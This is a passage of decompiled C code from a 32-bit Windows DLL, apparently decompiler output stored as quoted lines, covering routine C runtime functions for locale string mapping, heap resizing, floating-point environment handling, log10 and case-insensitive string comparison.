    "        int a9)",
    "{",
    "  int v9; // edi",
    "  signed int v10; // eax",
    "  UINT v11; // ebx",
    "  unsigned int v12; // eax",
    "  int result; // eax",
    "  unsigned int v14; // eax",
    "  void *v15; // esp",
    "  WCHAR *v16; // esi",
    "  WCHAR *v17; // eax",
    "  int v18; // edi",
    "  int v19; // eax",
    "  int v20; // ebx",
    "  unsigned int v21; // ecx",
    "  unsigned int v22; // eax",
    "  void *v23; // esp",
    "  WCHAR *v24; // edi",
    "  WCHAR *v25; // eax",
    "  int v26; // eax",
    "  _DWORD v27[3]; // [esp+0h] [ebp-14h] BYREF",
    "  int cchWideChar; // [esp+Ch] [ebp-8h]",
    "",
    "  v9 = Count;",
    "  if ( Count > 0 )",
    "  {",
    "    v10 = __strncnt(String, Count);",
    "    v9 = v10 + 1;",
    "    if ( v10 >= Count )",
    "      v9 = v10;",
    "  }",
    "  v11 = CodePage;",
    "  if ( !CodePage )",
    "  {",
    "    v11 = *((_DWORD *)a1->locinfo + 2);",
    "    CodePage = v11;",
    "  }",
    "  v12 = 1;",
    "  if ( a9 )",
    "    v12 = 9;",
    "  result = __acrt_MultiByteToWideChar(v11, v12, String, v9, 0, 0);",
    "  cchWideChar = result;",
    "  if ( result )",
    "  {",
    "    v14 = 2 * result < (unsigned int)(2 * result + 8) ? 2 * result + 8 : 0;",
    "    if ( !v14 )",
    "    {",
    "      v16 = 0;",
    "      goto LABEL_39;",
    "    }",
    "    if ( v14 > 0x400 )",
    "    {",
    "      v17 = (WCHAR *)sub_100202D0(v14);",
    "      v16 = v17;",
    "      if ( v17 )",
    "      {",
    "        *(_DWORD *)v17 = 56797;",
    "        goto LABEL_15;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v15 = alloca(v14);",
    "      v16 = (WCHAR *)v27;",
    "      if ( v27 )",
    "      {",
    "        v27[0] = 52428;",
    "LABEL_15:",
    "        v16 += 4;",
    "        if ( !v16 )",
    "          goto LABEL_39;",
    "        if ( !__acrt_MultiByteToWideChar(v11, 1u, String, v9, v16, cchWideChar) )",
    "          goto LABEL_39;",
    "        v18 = cchWideChar;",
    "        v19 = sub_10021DCF(a2, dwMapFlags, v16, cchWideChar, 0, 0, 0, 0, 0);",
    "        v20 = v19;",
    "        if ( !v19 )",
    "          goto LABEL_39;",
    "        if ( (dwMapFlags & 0x400) != 0 )",
    "        {",
    "          if ( !cchDest )",
    "            goto LABEL_40;",
    "          if ( v19 <= cchDest )",
    "          {",
    "            v20 = sub_10021DCF(a2, dwMapFlags, v16, v18, lpDestStr, cchDest, 0, 0, 0);",
    "            if ( v20 )",
    "              goto LABEL_40;",
    "          }",
    "          goto LABEL_39;",
    "        }",
    "        v21 = 2 * v19 + 8;",
    "        v22 = 2 * v19 < v21 ? v21 : 0;",
    "        if ( (2 * v20 < v21 ? v21 : 0) != 0 )",
    "        {",
    "          if ( v22 > 0x400 )",
    "          {",
    "            v25 = (WCHAR *)sub_100202D0(2 * v20 < v21 ? v21 : 0);",
    "            v24 = v25;",
    "            if ( v25 )",
    "            {",
    "              *(_DWORD *)v25 = 56797;",
    "LABEL_29:",
    "              v24 += 4;",
    "              if ( v24 && sub_10021DCF(a2, dwMapFlags, v16, cchWideChar, v24, v20, 0, 0, 0) )",
    "              {",
    "                v26 = cchDest",
    "                    ? sub_10023952(CodePage, 0, v24, v20, (LPSTR)lpDestStr, cchDest, 0, 0)",
    "                    : sub_10023952(CodePage, 0, v24, v20, 0, 0, 0, 0);",
    "                v20 = v26;",
    "                if ( v26 )",
    "                {",
    "                  _freea_crt((int)v24);",
    "LABEL_40:",
    "                  _freea_crt((int)v16);",
    "                  return v20;",
    "                }",
    "              }",
    "            }",
    "          }",
    "          else",
    "          {",
    "            v23 = alloca(v22);",
    "            v24 = (WCHAR *)v27;",
    "            if ( v27 )",
    "            {",
    "              v27[0] = 52428;",
    "              goto LABEL_29;",
    "            }",
    "          }",
    "        }",
    "        else",
    "        {",
    "          v24 = 0;",
    "        }",
    "        _freea_crt((int)v24);",
    "      }",
    "    }",
    "LABEL_39:",
    "    v20 = 0;",
    "    goto LABEL_40;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl sub_10029F61(",
    "        struct __crt_locale_pointers *a1,",
    "        wchar_t *a2,",
    "        DWORD dwMapFlags,",
    "        char *String,",
    "        size_t Count,",
    "        LPWSTR lpDestStr,",
    "        int cchDest,",
    "        UINT CodePage,",
    "        int a9)",
    "{",
    "  int result; // eax",
    "  int v10; // [esp+0h] [ebp-10h] BYREF",
    "  struct __crt_locale_pointers v11; // [esp+4h] [ebp-Ch] BYREF",
    "  char v12; // [esp+Ch] [ebp-4h]",
    "",
    "  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v10, a1);",
    "  result = __acrt_LCMapStringA_stat(&v11, a2, dwMapFlags, String, Count, lpDestStr, cchDest, CodePage, a9);",
    "  if ( v12 )",
    "    *(_DWORD *)(v10 + 848) &= ~2u;",
    "  return result;",
    "}",
    "",
    "",
    "int __usercall sub_10029FAA@<eax>(void *a1@<ebp>)",
    "{",
    "  return (unsigned __int8)__acrt_initialize_multibyte(a1) ^ 1;",
    "}",
    "",
    "",
    "BOOL __cdecl __acrt_SetEnvironmentVariableA(LPCCH lpMultiByteStr, LPCCH a2)",
    "{",
    "  BOOL v2; // ebx",
    "  WCHAR *v3; // esi",
    "  UINT utf8_acp_compatibility_codepage; // eax",
    "  UINT v5; // eax",
    "  int v6; // eax",
    "  int v8[2]; // [esp+8h] [ebp-30h] BYREF",
    "  LPCWSTR lpName; // [esp+10h] [ebp-28h]",
    "  int v10; // [esp+14h] [ebp-24h]",
    "  int v11; // [esp+18h] [ebp-20h]",
    "  char v12; // [esp+1Ch] [ebp-1Ch]",
    "  int v13[2]; // [esp+20h] [ebp-18h] BYREF",
    "  LPCWSTR lpValue; // [esp+28h] [ebp-10h]",
    "  int v15; // [esp+2Ch] [ebp-Ch]",
    "  int v16; // [esp+30h] [ebp-8h]",
    "  char v17; // [esp+34h] [ebp-4h]",
    "",
    "  v2 = 0;",
    "  v3 = 0;",
    "  v8[0] = 0;",
    "  v8[1] = 0;",
    "  lpName = 0;",
    "  v10 = 0;",
    "  v11 = 0;",
    "  v12 = 0;",
    "  v13[0] = 0;",
    "  v13[1] = 0;",
    "  lpValue = 0;",
    "  v15 = 0;",
    "  v16 = 0;",
    "  v17 = 0;",
    "  utf8_acp_compatibility_codepage = __acrt_get_utf8_acp_compatibility_codepage();",
    "  if ( !sub_1001CD4D(lpMultiByteStr, (int)v8, utf8_acp_compatibility_codepage) )",
    "  {",
    "    v5 = __acrt_get_utf8_acp_compatibility_codepage();",
    "    v6 = sub_1001CD4D(a2, (int)v13, v5);",
    "    v3 = (WCHAR *)lpValue;",
    "    if ( !v6 )",
    "      v2 = SetEnvironmentVariableW(lpName, lpValue);",
    "  }",
    "  if ( v17 )",
    "    _free_base(v3);",
    "  if ( v12 )",
    "    _free_base((void *)lpName);",
    "  return v2;",
    "}",
    "",
    "",
    "size_t __cdecl _msize(void *Block)",
    "{",
    "  if ( Block )",
    "    return HeapSize(hHeap, 0, Block);",
    "  *(_DWORD *)sub_1001E025() = 22;",
    "  _invalid_parameter_noinfo();",
    "  return -1;",
    "}",
    "",
    "",
    "size_t __cdecl sub_1002A090(void *Block)",
    "{",
    "  return _msize(Block);",
    "}",
    "",
    "",
    "void *__cdecl _realloc_base(void *Block, size_t Size)",
    "{",
    "  void *result; // eax",
    "",
    "  if ( !Block )",
    "    return sub_100202D0(Size);",
    "  if ( !Size )",
    "  {",
    "    _free_base(Block);",
    "    return 0;",
    "  }",
    "  if ( Size > 0xFFFFFFE0 )",
    "  {",
    "LABEL_6:",
    "    *(_DWORD *)sub_1001E025() = 12;",
    "    return 0;",
    "  }",
    "  while ( 1 )",
    "  {",
    "    result = HeapReAlloc(hHeap, 0, Block, Size);",
    "    if ( result )",
    "      return result;",
    "    if ( !sub_10025B20() || !_callnewh(Size) )",
    "      goto LABEL_6;",
    "  }",
    "}",
    "",
    "",
    "int __cdecl sub_1002A110(_DWORD *a1, int a2, int a3)",
    "{",
    "  unsigned int v4; // [esp-4h] [ebp-8h]",
    "",
    "  if ( (a3 & 0xFFF7FFFF & a2 & 0xFCF0FCE0) != 0 )",
    "  {",
    "    if ( a1 )",
    "      *a1 = sub_1002B18A(0, 0);",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    _invalid_parameter_noinfo();",
    "    return 22;",
    "  }",
    "  else",
    "  {",
    "    v4 = a3 & 0xFFF7FFFF;",
    "    if ( a1 )",
    "      *a1 = sub_1002B18A(a2, v4);",
    "    else",
    "      sub_1002B18A(a2, v4);",
    "    return 0;",
    "  }",
    "}",
    "",
    "",
    "int __cdecl fegetenv(fenv_t *Env)",
    "{",
    "  Env->_Fe_ctl = __acrt_fenv_get_control();",
    "  Env->_Fe_stat = __acrt_fenv_get_status();",
    "  return 0;",
    "}",
    "",
    "",
    "BOOL __cdecl sub_1002A1A0(_DWORD *a1)",
    "{",
    "  fenv_t Env; // [esp+4h] [ebp-8h] BYREF",
    "",
    "  __acrt_fenv_set_control(*a1);",
    "  __acrt_fenv_set_status(a1[1]);",
    "  Env = 0;",
    "  return fegetenv(&Env) || *a1 != Env._Fe_ctl || a1[1] != Env._Fe_stat;",
    "}",
    "",
    "",
    "int __cdecl sub_1002A200(unsigned int *a1)",
    "{",
    "  unsigned int Fe_ctl; // edx",
    "  unsigned int Fe_stat; // ecx",
    "  fenv_t Env; // [esp+0h] [ebp-8h] BYREF",
    "",
    "  Env._Fe_ctl = 0;",
    "  Env._Fe_stat = 0;",
    "  if ( fegetenv(&Env) )",
    "    return 1;",
    "  Fe_ctl = Env._Fe_ctl;",
    "  Fe_stat = Env._Fe_stat;",
    "  *a1 = Env._Fe_ctl;",
    "  a1[1] = Fe_stat;",
    "  Env._Fe_ctl = Fe_ctl | 0x1F;",
    "  if ( sub_1002A1A0(&Env) )",
    "    return 1;",
    "  sub_1002B074();",
    "  return 0;",
    "}",
    "",
    "",
    "__m128d __usercall _libm_sse2_log10_precise@<xmm0>(__m128d result@<xmm0>)",
    "{",
    "  int i; // edx",
    "  __m128i v2; // xmm5",
    "  __m128i v3; // xmm2",
    "  __m128d v4; // xmm0",
    "  int v5; // eax",
    "  __m128d v6; // xmm4",
    "  __m128d v7; // xmm6",
    "  __m128d v8; // xmm0",
    "  __m128d v9; // xmm6",
    "  __m128d v10; // xmm7",
    "  __m128d v11; // xmm4",
    "  unsigned int v12; // ecx",
    "  int v13; // ecx",
    "  __m128d v14; // xmm6",
    "  int v15; // edx",
    "  __m128d v16; // xmm3",
    "  __m128d v17; // xmm7",
    "  double v18; // xmm2_8",
    "  __m128d v19; // xmm0",
    "  double v20; // xmm1_8",
    "  __m128d v21; // xmm0",
    "  __m128i v22; // xmm1",
    "  int v23; // edx",
    "  double v24; // [esp+10h] [ebp-10h] BYREF",
    "  double v25; // [esp+18h] [ebp-8h] BYREF",
    "",
    "  if ( (_mm_getcsr() & 0x7F80) == 0x1F80 && (LOBYTE(v25) & 0x7F) == 0x7F )",
    "  {",
    "    v25 = result.m128d_f64[0];",
    "    for ( i = 0; ; i = -52 )",
    "    {",
    "      v2 = (__m128i)result;",
    "      v3.m128i_i64[1] = 0x3FDBC00000000000LL;",
    "      v4 = _mm_or_pd(_mm_and_pd(_mm_unpacklo_pd(result, result), (__m128d)xmmword_10035CE0), (__m128d)xmmword_10035D50);",
    "      v5 = _mm_extract_epi16((__m128i)_mm_add_pd((__m128d)xmmword_10035D00, v4), 0) & 0x7F0;",
    "      v6 = *(__m128d *)((char *)&xmmword_10036280 + v5);",
    "      v10 = *(__m128d *)((char *)&xmmword_10035E70 + v5);",
    "      v7 = _mm_and_pd((__m128d)xmmword_10035D10, v4);",
    "      v8 = _mm_sub_pd(v4, v7);",
    "      v9 = _mm_sub_pd(_mm_mul_pd(v7, v6), (__m128d)xmmword_10035CF0);",
    "      v10.m128d_f64[0] = v10.m128d_f64[0] + v9.m128d_f64[0];",
    "      v11 = _mm_mul_pd(v8, v6);",
    "      result = _mm_add_pd(v11, v9);",
    "      v12 = (_mm_extract_epi16(_mm_srli_epi64(v2, 0x34u), 0) & 0xFFF) - 1;",
    "      if ( v12 <= 0x7FD )",
    "        break;",
    "      v21.m128d_f64[0] = v25;",
    "      v22 = (__m128i)_mm_cmpeq_sd((__m128d)0LL, v21);",
    "      if ( _mm_extract_epi16(v22, 0) )",
    "      {",
    "        *(double *)v22.m128i_i64 = -INFINITY;",
    "        v23 = 8;",
    "CALL_LIBM_ERROR:",
    "        v24 = *(double *)v22.m128i_i64;",
    "        __libm_error_support(&v25, &v25, &v24, v23);",
    "        result.m128d_f64[0] = v24;",
    "        return result;",
    "      }",
    "      if ( v12 != -1 )",
    "      {",
    "        if ( v12 > 0x7FE )",
    "        {",
    "          if ( (((_WORD)v12 + 1) & 0x7FFu) >= 0x7FF",
    "            && (*(double *)v3.m128i_i64 = v25,",
    "                result.m128d_f64[1] = 0.43359375,",
    "                _mm_cvtsi128_si32(_mm_srli_epi64(v3, 0x20u)) & 0xFFFFF | _mm_cvtsi128_si32(v3)) )",
    "          {",
    "            v23 = 1001;",
    "          }",
    "          else",
    "          {",
    "            *(double *)v22.m128i_i64 = 0.0 / 0.0;",
    "            v23 = 9;",
    "          }",
    "        }",
    "        else",
    "        {",
    "          result.m128d_f64[0] = v25;",
    "          v22.m128i_i64[0] = 0xFFFFFFFFFFFFFLL;",
    "          result = _mm_or_pd(_mm_and_pd(result, (__m128d)xmmword_10035CE0), (__m128d)xmmword_10035D50);",
    "          if ( _mm_extract_epi16((__m128i)_mm_cmpeq_sd((__m128d)xmmword_10035D50, result), 0) )",
    "          {",
    "            result.m128d_f64[0] = INFINITY;",
    "            return result;",
    "          }",
    "          v23 = 1001;",
    "        }",
    "        goto CALL_LIBM_ERROR;",
    "      }",
    "      result.m128d_f64[0] = v25 * 4.503599627370496e15;",
    "    }",
    "    v13 = i + v12 - 1022;",
    "    v9.m128d_f64[0] = (double)v13;",
    "    v14 = _mm_unpacklo_pd(v9, v9);",
    "    v15 = 0;",
    "    if ( !((v13 << 10) + v5) )",
    "      v15 = 1;",
    "    v16 = _mm_mul_pd(result, result);",
    "    v17 = _mm_add_pd(",
    "            _mm_add_pd(v10, _mm_mul_pd(v14, (__m128d)xmmword_10035D20)),",
    "            _mm_and_pd(v11, (__m128d)xmmword_10035D30[v15]));",
    "    v16.m128d_f64[0] = v16.m128d_f64[0] * v16.m128d_f64[0] * result.m128d_f64[0];",
    "    v18 = 0.001616102407499711 * result.m128d_f64[0];",
    "    v19 = _mm_mul_pd(",
    "            _mm_add_pd(",
    "              _mm_mul_pd(_mm_add_pd(_mm_mul_pd((__m128d)xmmword_10035DA0, result), (__m128d)xmmword_10035DB0), result),",
    "              (__m128d)xmmword_10035DC0),",
    "            v16);",
    "    v20 = v19.m128d_f64[0] + v18;",
    "    result = _mm_unpackhi_pd(v19, v19);",
    "    result.m128d_f64[0] = result.m128d_f64[0] + v20 + _mm_unpackhi_pd(v17, v17).m128d_f64[0] + v17.m128d_f64[0];",
    "  }",
    "  else",
    "  {",
    "    v25 = _log10_default(LODWORD(result.m128d_f64[0]), HIDWORD(result.m128d_f64[0]));",
    "    return (__m128d)_mm_loadl_epi64((const __m128i *)&v25);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "double __usercall sub_1002A550@<st0>(__m128i a1@<xmm0>, const __m128i a2)",
    "{",
    "  int v2; // eax",
    "  bool v3; // zf",
    "  __m128d v4; // xmm0",
    "  double result; // st7",
    "  __m128d v7; // xmm0",
    "  int v8; // eax",
    "  __m128i v9; // xmm2",
    "  __m128i v10; // xmm1",
    "  double v11; // xmm1_8",
    "  __m128d v12; // xmm0",
    "  __m128d v13; // xmm1",
    "  char v14; // [esp+8h] [ebp-8h]",
    "",
    "  if ( (unsigned int)dword_1004014C >= 2 )",
    "  {",
    "    v4 = (__m128d)_mm_loadl_epi64(&a2);",
    "    *(double *)a2.m128i_i64 = _mm_round_sd(v4, v4, 10).m128d_f64[0];",
    "    return *(double *)a2.m128i_i64;",
    "  }",
    "  if ( !dword_1004099C )",
    "    goto LABEL_13;",
    "  v2 = _mm_getcsr() & 0x7F80;",
    "  v3 = v2 == 8064;",
    "  if ( v2 == 8064 )",
    "    v3 = (v14 & 0x7F) == 127;",
    "  if ( v3 )",
    "  {",
    "    v7 = (__m128d)_mm_srli_epi64(a1, 0x34u);",
    "    v8 = _mm_cvtsi128_si32((__m128i)v7);",
    "    v9 = _mm_sub_epi32((__m128i)xmmword_10035DF0, (__m128i)_mm_and_pd(v7, (__m128d)xmmword_10035E10));",
    "    v10 = _mm_srl_epi64(a1, v9);",
    "    if ( (v8 & 0x800) != 0 )",
    "    {",
    "      if ( v8 >= 3071 )",
    "      {",
    "        *(_QWORD *)&v11 = v10.m128i_i64[0] << v9.m128i_i8[0];",
    "        if ( v8 <= 3122 )",
    "        {",
    "          *(double *)a2.m128i_i64 = v11;",
    "          return v11;",
    "        }",
    "        return *(double *)a2.m128i_i64;",
    "      }",
    "      return -0.0;",
    "    }",
    "    else",
    "    {",
    "      v12 = (__m128d)_mm_loadl_epi64(&a2);",
    "      v13 = (__m128d)_mm_sll_epi64(v10, v9);",
    "      if ( v8 < 1023 )",
    "      {",
    "        a2.m128i_i64[0] = *(_OWORD *)&_mm_cmpnle_pd(v12, (__m128d)xmmword_10035E00) & 0x3FF0000000000000LL;",
    "        return *(double *)a2.m128i_i64;",
    "      }",
    "      else",
    "      {",
    "        if ( v8 > 1074 )",
    "          return *(double *)a2.m128i_i64;",
    "        *(double *)a2.m128i_i64 = v13.m128d_f64[0]",
    "                                + COERCE_DOUBLE(*(_OWORD *)&_mm_cmpnle_pd(v12, v13) & 0x3FF0000000000000LL);",
    "        return *(double *)a2.m128i_i64;",
    "      }",
    "    }",
    "  }",
    "  else",
    "  {",
    "LABEL_13:",
    "    sub_1002B910(*(double *)a2.m128i_i64);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "unsigned int __cdecl sub_1002A647(unsigned int a1)",
    "{",
    "  __int16 v1; // ax",
    "  int v2; // ebx",
    "  int v3; // eax",
    "  int v4; // esi",
    "",
    "  v1 = a1 & 0x8040;",
    "  if ( (a1 & 0x8040) == 0x8000 )",
    "  {",
    "    v2 = 3072;",
    "  }",
    "  else if ( v1 == 64 )",
    "  {",
    "    v2 = 2048;",
    "  }",
    "  else",
    "  {",
    "    v2 = 0;",
    "    if ( v1 == -32704 )",
    "      v2 = 1024;",
    "  }",
    "  v3 = a1 & 0x6000;",
    "  if ( (a1 & 0x6000) != 0 )",
    "  {",
    "    if ( v3 == 0x2000 )",
    "    {",
    "      v4 = 256;",
    "    }",
    "    else if ( v3 == 0x4000 )",
    "    {",
    "      v4 = 512;",
    "    }",
    "    else",
    "    {",
    "      v4 = 768;",
    "      if ( v3 != 24576 )",
    "        v4 = 0;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v4 = 0;",
    "  }",
    "  return v4",
    "       | v2",
    "       | ((a1 & 0x180 | ((a1 & 0x200 | ((((a1 & 0x800 | (a1 >> 2) & 0x400) >> 2) | a1 & 0x400) >> 2)) >> 3)) >> 3);",
    "}",
    "",
    "",
    "unsigned int __cdecl sub_1002A6FD(unsigned int a1)",
    "{",
    "  int v1; // esi",
    "  int v2; // eax",
    "  int v4; // [esp+Ch] [ebp-4h]",
    "",
    "  v1 = 768;",
    "  v4 = 4096;",
    "  if ( (a1 & 0x300) != 0 )",
    "  {",
    "    if ( (a1 & 0x300) != 0x200 )",
    "      v4 = 0;",
    "  }",
    "  else",
    "  {",
    "    v4 = 0x2000;",
    "  }",
    "  v2 = a1 & 0xC00;",
    "  if ( (a1 & 0xC00) != 0 )",
    "  {",
    "    if ( v2 == 1024 )",
    "    {",
    "      v1 = 256;",
    "    }",
    "    else if ( v2 == 2048 )",
    "    {",
    "      v1 = 512;",
    "    }",
    "    else if ( v2 != 3072 )",
    "    {",
    "      v1 = 0;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v1 = 0;",
    "  }",
    "  return v1",
    "       | v4",
    "       | (4 * (a1 & 0x1000))",
    "       | (16 * (a1 & 1))",
    "       | ((a1 & 8 | ((a1 & 0x10 | (a1 >> 2) & 8) >> 2)) >> 1)",
    "       | (2 * ((8 * (a1 & 2)) | a1 & 4));",
    "}",
    "",
    "",
    "int __cdecl sub_1002A7AC(unsigned int a1)",
    "{",
    "  int v1; // ecx",
    "  unsigned int v2; // esi",
    "  int v3; // ebx",
    "  unsigned int v4; // eax",
    "  int v5; // edi",
    "",
    "  v1 = a1 & 0xC00;",
    "  v2 = ((a1 >> 2) | a1 & 0xC03FFFFF) >> 22;",
    "  if ( v1 == 1024 )",
    "  {",
    "    v3 = 32832;",
    "  }",
    "  else if ( v1 == 2048 )",
    "  {",
    "    v3 = 64;",
    "  }",
    "  else",
    "  {",
    "    v3 = 0x8000;",
    "    if ( v1 != 3072 )",
    "      v3 = 0;",
    "  }",
    "  v4 = (((a1 >> 2) | a1 & 0xC03FFFFF) >> 22) & 0x300;",
    "  if ( (v2 & 0x300) != 0 )",
    "  {",
    "    if ( v4 == 256 )",
    "    {",
    "      v5 = 0x2000;",
    "    }",
    "    else if ( v4 == 512 )",
    "    {",
    "      v5 = 0x4000;",
    "    }",
    "    else",
    "    {",
    "      v5 = 24576;",
    "      if ( v4 != 768 )",
    "        v5 = 0;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v5 = 0;",
    "  }",
    "  return v5 | v3 | (8 * (v2 & 0x30 | (8 * (v2 & 8 | (4 * ((4 * (v2 & 2 | (4 * (v2 & 1)))) | v2 & 4))))));",
    "}",
    "",
    "",
    "unsigned int __cdecl sub_1002A866(unsigned int a1)",
    "{",
    "  unsigned int v1; // esi",
    "  int v2; // edi",
    "  int v3; // ebx",
    "  unsigned int v4; // eax",
    "",
    "  v1 = (a1 & 0xC00000 | (a1 >> 2) & 0xFC000) >> 14;",
    "  v2 = 0;",
    "  if ( (a1 & 0x3000) != 0 )",
    "  {",
    "    if ( (a1 & 0x3000) == 0x1000 )",
    "      v3 = 512;",
    "    else",
    "      v3 = 0;",
    "  }",
    "  else",
    "  {",
    "    v3 = 768;",
    "  }",
    "  v4 = ((a1 & 0xC00000 | (a1 >> 2) & 0xFC000) >> 14) & 0x300;",
    "  if ( (v1 & 0x300) != 0 )",
    "  {",
    "    if ( v4 == 256 )",
    "    {",
    "      v2 = 1024;",
    "    }",
    "    else if ( v4 == 512 )",
    "    {",
    "      v2 = 2048;",
    "    }",
    "    else",
    "    {",
    "      v2 = 3072;",
    "      if ( v4 != 768 )",
    "        v2 = 0;",
    "    }",
    "  }",
    "  return v2",
    "       | v3",
    "       | (a1 >> 2) & 0x1000",
    "       | ((a1 & 0xC00000 | (a1 >> 2) & 0xFC000) >> 15) & 4",
    "       | ((a1 & 0xC00000 | (a1 >> 2) & 0xFC000) >> 18) & 3",
    "       | (2 * ((4 * (v1 & 2 | (4 * (v1 & 1)))) | ((a1 & 0xC00000 | (a1 >> 2) & 0xFC000) >> 14) & 4));",
    "}",
    "",
    "",
    "int __cdecl sub_1002A91F(unsigned int a1)",
    "{",
    "  int result; // eax",
    "",
    "  result = -1;",
    "  if ( ((a1 >> 14) & 0x300) == ((a1 >> 22) & 0x300) )",
    "    return (a1 >> 14) & 0x300;",
    "  return result;",
    "}",
    "",
    "",
    "unsigned int __acrt_fenv_get_control()",
    "{",
    "  unsigned int v0; // esi",
    "  unsigned int v1; // ecx",
    "  unsigned int v2; // eax",
    "  _WORD v4[14]; // [esp+8h] [ebp-20h] BYREF",
    "  int v5; // [esp+24h] [ebp-4h]",
    "",
    "  memset(v4, 0, sizeof(v4));",
    "  __asm",
    "  {",
    "    fnstenv byte ptr [ebp+var_20]",
    "    fldenv  byte ptr [ebp+var_20]",
    "  }",
    "  v0 = sub_1002A6FD(v4[0] & 0x1F3F);",
    "  if ( dword_1004014C >= 1 )",
    "  {",
    "    v5 = _mm_getcsr();",
    "    v1 = v5 & 0xFFC0;",
    "  }",
    "  else",
    "  {",
    "    v1 = 0;",
    "  }",
    "  v2 = sub_1002A647(v1);",
    "  return v0 | ((v0 & 0x300 | (4 * (v0 & 0x3F | ((v2 & 0xFFFFFF00 | (4 * (v2 & 0x3F))) << 6)))) << 14) | v2;",
    "}",
    "",
    "",
    "int __usercall __acrt_fenv_get_status@<eax>(unsigned __int16 a1@<fpstat>)",
    "{",
    "  unsigned int v1; // esi",
    "  unsigned int v2; // edi",
    "  unsigned int v3; // edx",
    "",
    "  if ( dword_1004014C >= 1 )",
    "    v2 = _mm_getcsr() & 0x3F;",
    "  else",
    "    v2 = 0;",
    "  v3 = (16 * (v2 & 1)) | (2 * (v2 & 4 | (8 * (v2 & 2)))) | ((v2 & 8 | ((v2 & 0x10 | (v2 >> 2) & 8) >> 2)) >> 1);",
    "  v1 = (16 * (a1 & 1)) | (2 * (a1 & 4 | (8 * (a1 & 2)))) | ((a1 & 8 | ((a1 & 0x10 | (a1 >> 2) & 8u) >> 2)) >> 1);",
    "  return v1 | v3 | ((v1 | (v3 << 8)) << 16);",
    "}",
    "",
    "",
    "int __cdecl __acrt_fenv_set_control(unsigned int a1)",
    "{",
    "  int result; // eax",
    "  _DWORD v2[7]; // [esp+4h] [ebp-20h] BYREF",
    "  unsigned int v3; // [esp+20h] [ebp-4h]",
    "",
    "  memset(v2, 0, sizeof(v2));",
    "  __asm { fnstenv byte ptr [ebp+var_20] }",
    "  v3 = sub_1002A866(a1) & 0x1F3F;",
    "  v2[0] = v3 | v2[0] & 0xFFFFE0C0;",
    "  __asm { fldenv  byte ptr [ebp+var_20] }",
    "  result = sub_1002A7AC(a1);",
    "  if ( dword_1004014C >= 1 )",
    "  {",
    "    result &= 0xFFC0u;",
    "    _mm_setcsr(result | _mm_getcsr() & 0xFFFF003F);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "unsigned int __cdecl __acrt_fenv_set_status(int a1)",
    "{",
    "  unsigned int result; // eax",
    "  _DWORD v2[7]; // [esp+8h] [ebp-20h] BYREF",
    "",
    "  memset(v2, 0, sizeof(v2));",
    "  __asm { fnstenv [ebp+var_20] }",
    "  v2[1] = ((a1 & 0x200000) != 0 ? 2 : 0)",
    "        | ((a1 & 0x100000) != 0)",
    "        | ((a1 & 0x80000) != 0 ? 4 : 0)",
    "        | ((a1 & 0x40000) != 0 ? 8 : 0)",
    "        | ((a1 & 0x20000) != 0 ? 0x10 : 0)",
    "        | ((a1 & 0x10000) != 0 ? 0x20 : 0)",
    "        | v2[1] & 0xFFFFFFC0;",
    "  __asm { fldenv  [ebp+var_20] }",
    "  result = (a1 & 0x10000000) != 0;",
    "  if ( dword_1004014C >= 1 )",
    "  {",
    "    result = ((a1 & 0x20000000) != 0 ? 2 : 0)",
    "           | ((a1 & 0x10000000) != 0)",
    "           | ((a1 & 0x8000000) != 0 ? 4 : 0)",
    "           | ((a1 & 0x4000000) != 0 ? 8 : 0)",
    "           | ((a1 & 0x2000000) != 0 ? 0x10 : 0)",
    "           | ((a1 & 0x1000000) != 0 ? 0x20 : 0)",
    "           | _mm_getcsr() & 0xFFFFFFC0;",
    "    _mm_setcsr(result);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int sub_1002ABE3()",
    "{",
    "  return dword_10040880;",
    "}",
    "",
    "",
    "int __cdecl __ascii_strnicmp(unsigned __int8 *a1, unsigned __int8 *a2, int a3)",
    "{",
    "  int v3; // ecx",
    "  unsigned __int8 v6; // ah",
    "  unsigned __int8 v7; // al",
    "  bool v8; // cf",
    "",
    "  v3 = a3;",
    "  if ( a3 )",
    "  {",
    "    do",
    "    {",
    "      v6 = *a1;",
    "      v7 = *a2;",
    "      if ( !*a1 || !v7 )",
    "        break;",
    "      ++a1;",
    "      ++a2;",
    "      if ( v6 >= 0x41u && v6 <= 0x5Au )",
    "        v6 += 32;",
    "      if ( v7 >= 0x41u && v7 <= 0x5Au )",
    "        v7 += 32;",
    "      v8 = v6 < v7;",
    "      if ( v6 != v7 )",
    "        goto differ;",
    "      --v3;",
    "    }",
    "    while ( v3 );",
    "    v3 = 0;",
    "    v8 = v6 < v7;",
    "    if ( v6 == v7 )",
    "      return v3;",
    "differ:",
    "    v3 = -1;",
    "    if ( !v8 )",
    "      return 1;",
    "  }",
    "  return v3;",
    "}",
    "",
    "",
    "errno_t __cdecl _get_fmode(int *PMode)",
    "{",
    "  if ( PMode )",
    "  {",
    "    *PMode = dword_1004088C;",
    "    return 0;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    _invalid_parameter_noinfo();",
    "    return 22;",
    "  }",
    "}",
    "",
    "",
    "int __cdecl sub_1002AC7E(int a1, int a2)",
    "{",
    "  int v2; // ebx",
    "  int v3; // edx",
    "  LPCRITICAL_SECTION v4; // edi",
    "  int v5; // esi",
    "  char v6; // al",
    "  char v7; // ah",
    "",
    "  v2 = a1 >> 6;",
    "  v3 = 56 * (a1 & 0x3F);",
    "  v4 = lpCriticalSection[a1 >> 6];",
    "  v5 = 0x10000;",
    "  v6 = *((_BYTE *)&v4[1].LockSemaphore + v3);",
    "  v7 = *((_BYTE *)&v4[1].LockSemaphore + v3 + 1);",
    "  switch ( a2 )",
    "  {",
    "    case 0x4000:",
    "      *((_BYTE *)&v4[1].LockSemaphore + v3) = v6 | 0x80;",
    "      *((_BYTE *)&lpCriticalSection[v2][1].LockSemaphore + v3 + 1) = 0;",
    "      break;",
    "    case 0x8000:",
    "      *((_BYTE *)&v4[1].LockSemaphore + v3) = v6 & 0x7F;",
    "      break;",
